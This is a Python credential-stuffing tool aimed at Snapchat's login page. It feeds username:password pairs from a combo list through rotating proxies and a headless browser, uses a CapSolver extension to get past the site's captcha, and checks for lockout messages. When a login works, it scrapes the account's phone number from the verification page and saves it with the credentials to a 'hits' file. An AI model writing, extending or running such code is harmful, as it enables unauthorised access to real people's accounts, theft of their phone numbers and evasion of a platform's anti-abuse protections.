import asyncio
import os
import sys
from selenium_driverless import webdriver
from selenium_driverless.types.by import By
import selenium_driverless
from os.path import isfile
from clear_screen import clear
import re
from colorama import init as colorama_init
from colorama import Fore
from colorama import Style
import random

api_key = ''
threads = 1

def update_api_key_in_script(api_key):
    # Get the absolute path of the current directory
    current_dir = os.path.dirname(os.path.abspath(__file__))
    
    # Create the path of the my_content_script.js file
    script_file_path = os.path.join(current_dir, 'plugin', 'my-content-script.js')
    
    with open(script_file_path, 'r') as file:
        file_data = file.read()

    # Find the line with the apiKey and replace it
    file_data = re.sub(r'apiKey:\s*".*?",', f'apiKey: "{api_key}",', file_data)

    with open(script_file_path, 'w') as file:
        file.write(file_data)

    print(F"{Fore.BLUE}Network {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} Changed the CapSolver API key in extension.")


async def extract_phone_numbers(text):
    start = text.find('+')
    end = text.find('.')
    if start != -1 and end != -1:
        return text[start:end].strip()
    else:
        return None

def load_settings():
    # Check if proxy file exists
    if not isfile("proxy.txt"):
        # If not, create one with default settings
        with open("proxy.txt", 'w') as proxy_file:
            print(f"{Fore.GREEN}System {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} Created proxy file.")
            sys.exit(0)
    
    # Check if combo file exists
    if not isfile("combo.txt"):
        # If not, create one
        with open("combo.txt", 'w') as combo_file:
            print(f"{Fore.GREEN}System {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} Created combo file.")
            sys.exit(0)
    # Return the settings
    return

# Function to load proxies from a file
def load_proxies(file_path):
    with open(file_path, 'r') as proxy_file:
        proxies = proxy_file.readlines()
    return proxies

def load_combos(file_path):
    with open(file_path, 'r') as file:
        combos = file.readlines()
    return list(set(combos))  # Remove duplicates by converting to a set, then back to a list


def remove_proxy(file_path, proxy):
    with open(file_path, 'r') as f:
        proxies = f.readlines()
    with open(file_path, 'w') as f:
        for p in proxies:
            if p.strip() != proxy:
                f.write(p)

def write_to_file(number, login):
    with open('hits.txt', 'a') as f:
        f.write(f'{number} | {login}\n')

colorama_init()
clear()

settings = load_settings()
update_api_key_in_script(api_key) 
print('─' * 45)

used_proxies = set()
proxies = load_proxies("proxy.txt")
if not proxies:
        print(f"{Fore.GREEN}System {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} No proxies found.")
        sys.exit(0)

async def main(login):
    try:
        # Select a proxy that hasn't been used yet
        proxy = random.choice([p for p in proxies if p not in used_proxies])
        used_proxies.add(proxy)
        username, password = login.strip().split(':')

        #proxy_parts = proxy.split(':')
        #formatted_proxy = f'{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}'

        options = webdriver.ChromeOptions()
        options.single_proxy = proxy
        options.add_argument('--window-size=1280,720 --window-position=0,0')
        options.headless = True
        # Get the absolute path of the current directory
        current_dir = os.path.dirname(os.path.abspath(__file__))

        # Create the path of the unpacked extension
        unpacked_extension_path = os.path.join(current_dir, 'plugin')

        options.add_argument('--load-extension={}'.format(unpacked_extension_path))

        async with webdriver.Chrome(options=options) as driver:
            await driver.delete_all_cookies()
            await driver.get('https://accounts.snapchat.com/accounts/v2/login')
            await driver.sleep(0.5)

            print(f"{Fore.CYAN}Account{Fore.WHITE}:{Fore.CYAN}Login {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} " + login, end='')
            print(f"{Fore.CYAN}Account{Fore.WHITE}:{Fore.CYAN}Proxy {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} " + proxy, end='')

            try:
                loader = await driver.find_element(By.XPATH, '//*[@id="account_identifier_form"]/div[3]/button', timeout=30)
            except:
                print(F"{Fore.BLUE}Network {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} Error: Failed to load website.")
                print(f"{Fore.WHITE}[{Fore.RED}+{Fore.WHITE}] {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.RED} Number not found. {Fore.WHITE}")
                await driver.quit()
                
                return

            try:
                button = await driver.find_element(By.XPATH, '/html/body/div[2]/div/div/div[4]/div/section/div/section/div[2]/div/div/div/div[3]/button[2]', timeout=5)
                await button.click()
                print(f"{Fore.YELLOW}Cookies {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} Accepted cookies.")
            except:
                print(f"{Fore.YELLOW}Cookies {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} No cookies button found.")

            email = await driver.find_element(By.NAME, 'accountIdentifier', timeout=5)
            await email.write(username)

            button = await driver.find_element(By.XPATH, '/html/body/div[2]/div/div/div[3]/article/div[1]/div[3]/form/div[3]/button', timeout=5)
            await button.click()

            try:
                error = await driver.find_element(By.XPATH, '//*[@id="error_message"]/p', timeout=3)
                if(await error.text == "Your previous sign-in attempt could not be completed. Please try again."):
                    print(f"{Fore.CYAN}Account {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} Account locked.")
                    print(f"{Fore.WHITE}[{Fore.RED}+{Fore.WHITE}] {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.RED} Number not found. {Fore.WHITE}")
                    await driver.quit()
                    
                    return
            except:
                pass

            try:
                xsrf_token = await driver.find_element(By.NAME, 'xsrf_token', timeout=5)
                xsrf_token_value = await xsrf_token.get_attribute('value')
                arkose = await driver.find_element(By.XPATH, '//*[@id="arkose-iframe"]', timeout=5)
                arkose_document = await arkose.content_document
                challenge = await arkose_document.find_element(By.XPATH, '/html/body/div[2]/iframe', timeout=5)
                challenge_document = await challenge.content_document
                funcaptcha = await challenge_document.find_element(By.ID, 'game-core-frame', timeout=5)
                funcaptcha_document = await funcaptcha.content_document
                funcaptcha_button = await funcaptcha_document.find_element(By.XPATH, '//*[@id="root"]/div/div[1]/button', timeout=5)
                if await funcaptcha_button.is_clickable():
                    print(f"{Fore.MAGENTA}Captcha {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} Found captcha.")
                    
                fc_token = await challenge_document.find_element(By.NAME, 'fc-token', timeout=5)
                fc_token_value = await fc_token.get_attribute('value')
                page_url = await driver.current_url

                parts = fc_token_value.split('|')
                for part in parts:
                    if part.startswith('pk='):
                        fc_public_token = part.split('=')[1]
                    elif part.startswith('surl='):
                        surl = part.split('=')[1]
                        surl = surl.replace('%3A%2F%2F', '://')

                print(f"{Fore.MAGENTA}Captcha {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} Token: " + fc_public_token)
                print(f"{Fore.MAGENTA}Captcha {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} Surl: " + surl)
                print(f"{Fore.MAGENTA}Captcha {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} Page URL: " + page_url)
                print(f"{Fore.MAGENTA}Captcha {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} XSRF Token: " + xsrf_token_value)
                print(f"{Fore.MAGENTA}Captcha {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} Solving captcha...")
                await driver.sleep(30)
            except Exception as e:
                print(f"{Fore.MAGENTA}Captcha {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} Captcha not found.")

            try:
                error = await driver.find_element(By.XPATH, '//*[@id="error_message"]/p', timeout=3)
                if(await error.text == "Your previous sign-in attempt could not be completed. Please try again."):
                    print(f"{Fore.CYAN}Account {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} Account locked.")
                    print(f"{Fore.WHITE}[{Fore.RED}+{Fore.WHITE}] {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.RED} Number not found. {Fore.WHITE}")
                    await driver.quit()
                    
                    return
            except:
                pass

            try:
                loader = await driver.find_element(By.XPATH, '//*[@id="password_form"]/div[3]/button', timeout=30)
            except:
                print(f"{Fore.RED}CapSolver {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} Error: Failed to solve captcha.")
                print(f"{Fore.WHITE}[{Fore.RED}+{Fore.WHITE}] {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.RED} Number not found. {Fore.WHITE}")
                await driver.quit()
                
                return

            pasW = await driver.find_element(By.NAME, 'password', timeout=5)
            await pasW.write(password)

            button = await driver.find_element(By.XPATH, '/html/body/div[2]/div/div/div[3]/article/div/form/div[3]/button', timeout=5)
            await button.click()

            try:
                error = await driver.find_element(By.XPATH, '//*[@id="error_message"]/p', timeout=3)
                if(await error.text == "Due to repeated attempts or other unusual activity, communication to this phone/email is temporarily disabled. Please try again later."):
                    print(f"{Fore.CYAN}Account {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} Account locked.")
                    print(f"{Fore.WHITE}[{Fore.RED}+{Fore.WHITE}] {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.RED} Number not found. {Fore.WHITE}")
                    await driver.quit()
                    
                    return
                if(await error.text == "Incorrect password, please try again."):
                    print(f"{Fore.CYAN}Account {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} Incorrect password.")
                    print(f"{Fore.WHITE}[{Fore.RED}+{Fore.WHITE}] {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.RED} Number not found. {Fore.WHITE}")
                    await driver.quit()
                    
                    return
                if(await error.text == "Your previous sign-in attempt could not be completed. Please try again."):
                    print(f"{Fore.CYAN}Account {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} Incorrect password.")
                    print(f"{Fore.WHITE}[{Fore.RED}+{Fore.WHITE}] {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.RED} Number not found. {Fore.WHITE}")
                    await driver.quit()
                    
                    return
            except:
                pass

            loaderBuffer = 0
            try:
                loader = await driver.find_element(By.XPATH, '//*[@id="otp_form"]/div[3]/button', timeout=15)
            except:
                loaderBuffer += 1

            try:
                loader = await driver.find_element(By.XPATH, '//*[@id="TIV_RESEND_FORM"]/button/span', timeout=15)
            except:
                loaderBuffer += 1

            if loaderBuffer == 2:
                print(F"{Fore.BLUE}Network {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} Error: Failed to load website.")
                print(f"{Fore.WHITE}[{Fore.RED}+{Fore.WHITE}] {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.RED} Number not found. {Fore.WHITE}")
                await driver.quit()
                
                return

            try:
                phone = await driver.find_element(By.XPATH, '//*[@id="otp-root"]/div/div[3]/article/div/p', timeout=5)
                number = await extract_phone_numbers(await phone.text)
                print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.GREEN} Number: " + number + f"{Fore.WHITE}")
                write_to_file(number, login)  # Call the new function here
            except Exception as e:
                try:
                    phone = await driver.find_element(By.XPATH, '//*[@id="tiv-v2-web-poller-root"]/div/div/div/div[2]/div[2]/span[2]', timeout=5)
                    print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.GREEN} Number: " + await phone.text + f"{Fore.WHITE}")
                    write_to_file(await phone.text, login)  # And here
                except Exception as e2:
                    print(f"{Fore.WHITE}[{Fore.RED}+{Fore.WHITE}] {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.RED} Number not found. {Fore.WHITE}")
                    
                    await driver.quit()
                    await os._exit(0)

            await driver.sleep(1)
            
            await driver.quit()
            return
    except Exception as e:
        print(f"{Fore.BLUE}Network {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} Error!")
        print(f"{Fore.WHITE}[{Fore.RED}+{Fore.WHITE}] {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.RED} Number not found. {Fore.WHITE}")
        print(e)
        await driver.quit()
        
        return

async def run_in_parallel(combos, limit):
    semaphore = asyncio.Semaphore(limit)

    async def bound_main(combo):
        async with semaphore:
            await main(combo)

    tasks = [bound_main(combo) for combo in combos]
    await asyncio.gather(*tasks)

combos = load_combos("combo.txt")
asyncio.run(run_in_parallel(combos, threads))